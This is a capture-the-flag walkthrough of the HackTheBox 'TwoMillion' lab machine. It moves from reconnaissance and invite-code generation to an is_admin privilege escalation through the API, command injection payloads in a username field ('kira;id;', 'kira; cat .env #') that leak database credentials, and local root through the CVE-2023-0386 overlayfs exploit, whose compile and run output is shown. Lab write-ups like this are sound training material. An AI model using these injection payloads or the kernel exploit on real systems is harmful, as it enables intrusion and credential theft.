
#  nmap 

				┌──(kali㉿kali)-[~/HackTheBox/vpn]
				└─$ nmap -p- 10.10.11.221 --min-rate=1000
				Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-03 07:16 EDT
				Nmap scan report for 10.10.11.221
				Host is up (0.28s latency).
				Not shown: 65533 closed tcp ports (reset)
				PORT   STATE SERVICE
				22/tcp open  ssh
				80/tcp open  http
				Nmap done: 1 IP address (1 host up) scanned in 80.79 seconds
				____________________________________________________________________________________________
# network enumeration

				┌──(kali㉿kali)-[~/HackTheBox/vpn]
				└─$ nmap -p22,80 -sC -A 10.10.11.221 --min-rate=1000
				Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-03 07:18 EDT
				Nmap scan report for 10.10.11.221
				Host is up (0.28s latency).

				PORT   STATE SERVICE VERSION
				22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
				| ssh-hostkey:
				|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
				|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
				80/tcp open  http    nginx
				|_http-title: Did not follow redirect to http://2million.htb/
				Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
				Device type: general purpose|router
				Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
				OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
				OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
				Network Distance: 2 hops
				Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

				TRACEROUTE (using port 80/tcp)
				HOP RTT       ADDRESS
				1   281.33 ms 10.10.14.1
				2   281.31 ms 10.10.11.221
				OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
				Nmap done: 1 IP address (1 host up) scanned in 21.42 seconds
______________________________________________________________________________________________________________________

## targeted endpoint

- /invite

`source code`
   <script src="/js/htb-frontend.min.js"></script>
    <script defer src="/js/inviteapi.min.js"></script>
    <script defer>
       $(document).ready(function() {
            $('#verifyForm').submit(function(e) {
                e.preventDefault();

                var code = $('#code').val();
                var formData = { "code": code };

                $.ajax({
                    type: "POST",
                    dataType: "json",
                    data: formData,
                    url: '/api/v1/invite/verify',
                    success: function(response) {
                        if (response[0] === 200 && response.success === 1 && response.data.message === "Invite code is valid!") {
                            // Store the invite code in localStorage
                            localStorage.setItem('inviteCode', code);

                            window.location.href = '/register';
                        } else {
                            alert("Invalid invite code. Please try again.");
                        }
                    },
                    error: function(response) {
                        alert("An error occurred. Please try again.");
                    }

____________________________________________________________________________________________

# fishy / juicy
src="/js/inviteapi.min.js
/api/v1/invite/verify

____________________________________________________________________________________________

# inspecting the static endpoint...
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c>

# de-obfuscating this code...

```
 function verifyInviteCode(code) {
    var formData = { "code": code };
    $.ajax({
        type: "POST",
        dataType: "json",
        data: formData,
        url: '/api/v1/invite/verify',
        success: function(response) {
            console.log(response);
        },
        error: function(response) {
            console.log(response);
        }
    });
}

function makeInviteCode() {
    $.ajax({
        type: "POST",
        dataType: "json",
        url: '/api/v1/invite/how/to/generate',
        success: function(response) {
            console.log(response);
        },
        error: function(response) {
            console.log(response);
        }
    });
}
```
____________________________________________________________________________________________

 ### From this point onward if you stop the machine you need to redo the procedure ###
 
[ "I was having problems because my valid and new credentials were also no working well guess what i didn't fire up the machine lol!" ]

# juicy
- /api/v1/invite/how/to/generate

[ This endpoint seems very interesting, so in order to access it we  use cURL. ]

┌──(kali㉿kali)-[~/HackTheBox/2mil]
└─$ curl -X POST http://2million.htb/api/v1/invite/how/to/generate | jq #beautify the outputted JSON
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   249    0   249    0     0    320      0 --:--:-- --:--:-- --:--:--   321
{
  "0": 200,
  "success": 1,
  "data": {
    "data": "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr",
    "enctype": "ROT13"
  },
  "hint": "Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."
}
____________________________________________________________________________________________

# decoding
Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr

# decoded
In order to generate the invite code, make a POST request to /api/v1/invite/generate
____________________________________________________________________________________________

# Following instructions from decoded data

┌──(kali㉿kali)-[~/HackTheBox/2mil]
└─$ curl -X POST http://2million.htb/api/v1/invite/generate | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    91    0    91    0     0    116      0 --:--:-- --:--:-- --:--:--   116
{
  "0": 200,
  "success": 1,
  "data": {
    "code": "VVAwMzMtRVNHUzQtRjQwSzYtV1FNMTI=",
    "format": "encoded"
  }
}
____________________________________________________________________________________________

# decoding the code
┌──(kali㉿kali)-[~/HackTheBox/2mil]
└─$ echo VVAwMzMtRVNHUzQtRjQwSzYtV1FNMTI= | base64 -d
UP033-ESGS4-F40K6-WQM12
____________________________________________________________________________________________

## attack vector ##
#not from sitemap where your proxy is crawling but after your authentacation
- REquest
	GET /api/v1 HTTP/1.1
____________________________________________________________________________________________
- Response

("jeez obsucate it uyoursself.")
{"v1":{"user":{"GET":{"\/api\/v1":"Route List","\/api\/v1\/invite\/how\/to\/generate":"Instructions on invite code generation","\/api\/v1\/invite\/generate":"Generate invite code","\/api\/v1\/invite\/verify":>
____________________________________________________________________________________________

# got this

{"loggedin":true,"username":"kira","is_admin":0}

# from 
GET /api/v1/user/auth HTTP/1.1

____________________________________________________________________________________________
# got this

{"message":false}

# from
GET /api/v1/admin/auth HTTP/1.1

____________________________________________________________________________________________

# breakthrough
"Got this"
{"id":20,"username":"kira","is_admin":1}

"from this"
PUT /api/v1/admin/settings/update HTTP/1.1

{
"email":"kira@mail.com",
"is_admin":1
}
____________________________________________________________________________________________
now now we are said to abuse
/api/v1/admin/generate/vpn but...
most walkthroughs just say “do OS command injection here” without explaining why that endpoint screams injection. Let’s break it down;

- The endpoint’s name implies it’s generating VPN configs.
- That often involves calling system tools like openvpn, easy-rsa, or shell scripts.
- If the backend is invoking shell commands with user-supplied input (e.g., username, config name), that’s a classic injection vector

# further testing

"Got this"
uid=33(www-data) gid=33(www-data) groups=33(www-data)

"From"
/api/v1/admin/generate/vpn

{
"email":"kira@mail.com",
"username": "kira;id;",
"is_admin":1
}
____________________________________________________________________________________________
# got credentials

REQUEST
{
"email":"kira@mail.com",
"username": "kira; cat .env #",
"is_admin":1
}

RESPONSE

DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
____________________________________________________________________________________________

# verifed creds
┌──(kali㉿kali)-[~/HackTheBox/2mil]
└─$ ssh admin@10.10.11.221
____________________________________________________________________________________________

# user flag (I'm playing in adventure mode btw...)
admin@2million:~$ ls
CVE-2023-0386-main  user.txt
admin@2million:~$ cat user.txt
____________________________________________________________________________________________

# exploring the file system
admin@2million:~$ cd ..
admin@2million:/home$ ls
admin
admin@2million:/home$ ls -la
total 12
drwxr-xr-x  3 root  root  4096 Jun  6  2023 .
drwxr-xr-x 19 root  root  4096 Jun  6  2023 ..
drwxr-xr-x  4 admin admin 4096 Jun  6  2023 admin
admin@2million:/home$ cd ..
admin@2million:/$ ls
bin  boot  dev  etc  home  lib  lib32  lib64  libx32  lost+found  media  mnt  opt  proc  root  run  sbin  snap  srv  sys  tmp  usr  var
admin@2million:/$ cd var
admin@2million:/var$ ls
backups  cache  crash  lib  local  lock  log  mail  opt  run  snap  spool  tmp  www
____________________________________________________________________________________________
#reading the mail
admin@2million:/var$ cd mail
admin@2million:/var/mail$ ls
admin
admin@2million:/var/mail$ cat admin
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: <9876543210@2million.htb>
X-Mailer: ThunderMail Pro 5.2
____________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. T>

HTB Godfather
____________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
# since we're already SSH'ed in the box we will skip the steps of documentation about installing other packages and softwares

admin@2million:/$ cd tmp
admin@2million:/tmp$ ls
snap-private-tmp                                                              systemd-private-d8a91fad6b604801b336e99afa50f137-systemd-logind.service-ezGLYI     vmware-root_584-2688619665
systemd-private-d8a91fad6b604801b336e99afa50f137-memcached.service-EgC5i5     systemd-private-d8a91fad6b604801b336e99afa50f137-systemd-resolved.service-qYCvIg
systemd-private-d8a91fad6b604801b336e99afa50f137-ModemManager.service-gwuxqg  systemd-private-d8a91fad6b604801b336e99afa50f137-systemd-timesyncd.service-sVV74q
____________________________________________________________________________________________

# now we will write the program (CVE) in the system
//which can be found here: https://github.com/DataDog/security-labs-pocs/blob/main/proof-of-concept-exploits/overlayfs-cve-2023-0386/poc.c
____________________________________________________________________________________________

# now following instructions
admin@2million:/tmp$ gcc poc.c -o poc -D_FILE_OFFSET_BITS=64 -static -lfuse -ldl
/usr/bin/ld: /usr/lib/gcc/x86_64-linux-gnu/11/../../../x86_64-linux-gnu/libfuse.a(fuse.o): in function `fuse_new_common':
(.text+0xaf4e): warning: Using 'dlopen' in statically linked applications requires at runtime the shared libraries from the glibc version used for linking
admin@2million:/tmp$ chmod +x poc && ./poc
Waiting 1 sec...
unshare -r -m sh -c 'mount -t overlay overlay -o lowerdir=/tmp/ovlcap/lower,upperdir=/tmp/ovlcap/upper,workdir=/tmp/ovlcap/work /tmp/ovlcap/merge && ls -la /tmp/ovlcap/merge && touch /tmp/ovlcap/merge/file'
[+] readdir
[+] getattr_callback
/file
total 8
drwxrwxr-x 1 root   root     4096 Sep  9 03:06 .
drwxrwxr-x 6 root   root     4096 Sep  9 03:06 ..
-rwsrwxrwx 1 nobody nogroup 16096 Jan  1  1970 file
[+] open_callback
/file
[+] read_callback
    cnt  : 0
    clen  : 0
    path  : /file
    size  : 0x4000
    offset: 0x0
[+] open_callback
/file
[+] open_callback
/file
[+] ioctl callback
path /file
cmd 0x80086601
/tmp/ovlcap/upper/file
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.
____________________________________________________________________________________________

# and now we are root
root@2million:/tmp# id
uid=0(root) gid=0(root) groups=0(root),1000(admin)

# the flag can be found in th /root directory
root@2million:/tmp# cd /root
root@2million:/root# ls
root.txt  snap  thank_you.json
